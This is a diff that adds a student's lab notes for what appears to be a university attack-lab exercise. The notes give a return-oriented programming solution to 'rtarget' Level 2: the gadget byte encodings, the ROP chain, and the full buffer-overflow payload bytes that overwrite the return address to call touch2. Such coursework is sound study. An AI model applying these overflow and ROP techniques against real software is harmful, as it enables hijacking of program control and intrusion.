@@ -124,3 +124,81 @@ How to run:
    future calls
 2. Try to reuse the same stack space for ret addresses as before
 3. Also still need to set the %rdi registers for the address of the string
+
+# rtarget - Level 2
+
+Objective: Call touch2 with cookie as arg
+
+Game plan:
+
+1. Find gadgets that replicate what you did in the ctarget version
+2. Write the addresses for those gadets to the stack in order overwriting the
+   return addr
+
+stuff to write to stack:
+
+```
+addr for gadget to assign cookie to rdi
+cookie: 0x59b997fa
+addr for touch2
+```
+
+ROP style code to call:
+
+```
+popq %rdi # 5f - pop cookie into rdi
+ret       # c3 - call touch2
+```
+
+Gadgets we have from farm:
+
+00 00 00 c3       - not useful
+b8 fb 78 90 90 c3 - not useful
+48 89 c7 c3       - movq %rax, %rdi, movl %eax, %edi
+51 73 58 90 c3    - popq %rax
+89 c7 c7 c3       - not useful
+c2 58 92 c3       - not useful
+48 8d c7 c3       - not useful
+48 89 c7 90 c3    - repeat - movq %rax, %rdi, movl %eax, %edi
+b8 29 58 90 c3    - repeat - popq %rax
+
+ROP style code using these gadets:
+
+```
+         # 0x004019ab
+pop %rax # 58 - pop cookie into rax
+nop      # 90 - required nop from gadet
+retq     # c3 - ret to next gadget
+
+               # 0x004019a2
+mov %rax, %rdi # 48 89 c7 - set first arg to cookie value
+retq           # c3 - ret to touch2
+```
+
+resolved stack values:
+
+```
+0x00000000004019ab # lowest addr
+0x0000000059b997fa
+0x00000000004019a2
+0x00000000004017ec # highest addr
+```
+
+payload bytes to write out:
+
+```
+00 00 00 00 00 00 00 00 <- og buf
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+ab 19 40 00 00 00 00 00 <- og ret
+fa 97 b9 59 00 00 00 00
+a2 19 40 00 00 00 00 00
+ec 17 40 00 00 00 00 00
+```
+
+# rtarget - Level 3
+
+Skip - This doesn't seem too difficult but the handout warned me away from
+investing too much time into this.
